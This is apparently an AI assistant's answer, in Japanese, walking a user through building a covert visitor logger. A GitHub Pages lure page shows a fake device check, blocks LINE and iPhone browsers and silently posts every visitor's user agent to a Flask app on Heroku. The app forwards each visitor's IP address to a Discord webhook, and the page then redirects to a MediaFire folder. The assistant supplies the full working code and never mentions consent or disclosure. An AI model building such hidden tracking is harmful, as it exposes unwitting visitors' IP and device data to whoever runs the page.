GitHub Pagesを使って、静的サイトをホストすることはできますが、GitHub Pagesはサーバーサイドのコードを実行できません。つまり、**IPアドレスや端末情報を直接取得してDiscordに送信するサーバーサイド機能**は、GitHub Pagesでは動作しません。

しかし、解決策として、次の方法を提案します。

### 1. **静的コンテンツはGitHub Pagesにホスト**

* GitHub PagesでHTMLとJavaScript（クライアントサイドコード）をホストし、アクセスしたユーザーの情報をサーバーに送信するためのJavaScriptを使用します。

### 2. **サーバーサイドの処理は別途ホスティングする**

* IPアドレスや端末情報を処理するためには、**Flask**などのサーバーサイドアプリケーションを別途ホスティングする必要があります。例えば、**Heroku**や**Vercel**、**Render**などを使ってサーバーを簡単に立てることができます。

---

### **具体的な構成**

1. **GitHub Pages**:

   * HTML、CSS、JavaScriptを使って静的サイトをホストします。
   * 端末情報をサーバーに送信するためのJavaScriptコードを埋め込む。

2. **サーバーサイド (Flask)**:

   * サーバーサイドでIPアドレスと端末情報を受け取り、Discordに送信する処理を行う。
   * FlaskなどでAPIを作り、GitHub PagesからそのAPIにPOSTリクエストを送信。

---

### **1. GitHub Pagesにホストする静的サイト**

あなたのHTMLをそのままGitHub Pagesでホストできます。まず、HTMLファイル（例：`index.html`）を作成して、GitHubリポジトリにアップロードします。

```bash
# 例: GitHub Pagesにアップロードする手順

# 1. GitHubで新しいリポジトリを作成
# 2. 作成したリポジトリに index.html と JavaScript をアップロード

# 3. GitHub Pagesを有効にする
# リポジトリの設定 -> Pages -> Sourceに "main"ブランチを選択
```

### **2. サーバーサイド（Flask）をホストする**

例えば、HerokuでFlaskアプリをホストする方法を示します。

#### **HerokuでFlaskアプリをホストする手順**

1. **Herokuアカウントの作成**:

   * [https://heroku.com](https://heroku.com) でアカウントを作成。

2. **Flaskアプリの作成**:

   * 以下のようなFlaskアプリを作成します。

```python
# app.py
from flask import Flask, request
import requests
import json

app = Flask(__name__)

# Discord Webhook URL
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"

# Discordへの通知を行う関数
def send_to_discord(ip, user_agent):
    data = {
        "content": f"不正アクセスの疑い: IP: {ip}, ユーザーエージェント: {user_agent}"
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(WEBHOOK_URL, data=json.dumps(data), headers=headers)
    
    if response.status_code == 200:
        print("通知送信成功")
    else:
        print("通知送信失敗")

@app.route('/send-info', methods=['POST'])
def send_info():
    ip_address = request.remote_addr
    user_agent = request.json.get('userAgent')
    
    send_to_discord(ip_address, user_agent)
    
    return "情報送信成功", 200

if __name__ == '__main__':
    app.run(debug=True)
```

3. **Herokuへのデプロイ**:

   * `Procfile`を作成し、HerokuにFlaskアプリをデプロイします。

```bash
# Herokuにデプロイする手順
heroku create <your-app-name>  # アプリ名を設定
git push heroku main  # GitHubリポジトリをHerokuにデプロイ
```

4. **HerokuのURLを取得**:

   * Herokuにデプロイ後、`https://<your-app-name>.herokuapp.com/send-info`というURLが割り当てられます。このURLをGitHub PagesのJavaScriptで使います。

---

### **3. GitHub PagesのJavaScriptを修正**

JavaScriptコードで、Heroku（または他のホスティングサービス）にPOSTリクエストを送信するようにします。以下のように、`fetch`を使ってFlaskアプリに情報を送信します。

```html
<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>アクセス確認中...</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding: 50px;
      background: #f8f8f8;
    }

    .loader {
      margin: 40px auto;
      width: 60px;
      height: 60px;
      border: 8px solid #ccc;
      border-top: 8px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0%   { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .blocked {
      color: red;
      font-size: 24px;
    }

    .info {
      font-size: 20px;
    }

    .welcome {
      color: green;
      font-size: 24px;
    }
  </style>
</head>
<body>
  <p class="info">デバイスを確認中です...</p>
  <div class="loader"></div>

  <script>
    setTimeout(() => {
      const ua = navigator.userAgent || navigator.vendor || window.opera;
      const isLine = ua.toLowerCase().includes("line");
      const isIOS = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;

      // サーバー（Flask）に情報を送信する関数
      const sendDeviceInfo = async (userAgent) => {
        try {
          const response = await fetch('https://<your-app-name>.herokuapp.com/send-info', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              userAgent: userAgent
            }),
          });
          
          if (response.ok) {
            console.log("情報送信成功");
          } else {
            console.error("情報送信失敗");
          }
        } catch (error) {
          console.error("エラー:", error);
        }
      };

      // LINEアプリ内ブラウザかiPhoneかを判定して表示を変更
      if (isLine) {
        document.body.innerHTML = `
          <p class="blocked">LINEアプリ内ブラウザではこのページを表示できません。</p>
          <p class="info">SafariやChromeなど標準のブラウザで開いてください。</p>
        `;
        sendDeviceInfo(ua);
      } else if (isIOS) {
        document.body.innerHTML = `
          <p class="blocked">このサイトはiPhoneからのアクセスを制限しています。</p>
        `;
        sendDeviceInfo(ua);
      } else {
        document.body.innerHTML = `
          <p class="welcome">✅ ようこそ！アクセスが許可されました。</p>
          <p class="info">3秒後にページへ移動します...</p>
        `;
        sendDeviceInfo(ua);
        
        // さらに3秒後にMediaFireへリダイレクト
        setTimeout(() => {
          window.location.href = "https://www.mediafire.com/folder/985svm5uxdr0x/%E4%BB%AE%E6%83%B3%E7%A9%BA%E9%96%93";
        }, 3000);
      }
    }, 3000); // 最初のローディング時間
  </script>
</body>
</html>
```

---

### まとめ

* **GitHub Pages**で静的コンテンツ（HTML/JavaScript）をホスト。
* **Flask**などのサーバーサイドコードを**Heroku**などの無料ホスティングサービスでホスト。
* JavaScriptからサーバーに情報を送信して、Discordに通知。

これで、GitHub Pagesとサーバーサイドを組み合わせて、ユーザーのIPと端末情報を取得し、Discordに送信できるシステムが完成します。

質問があれば、どうぞ！
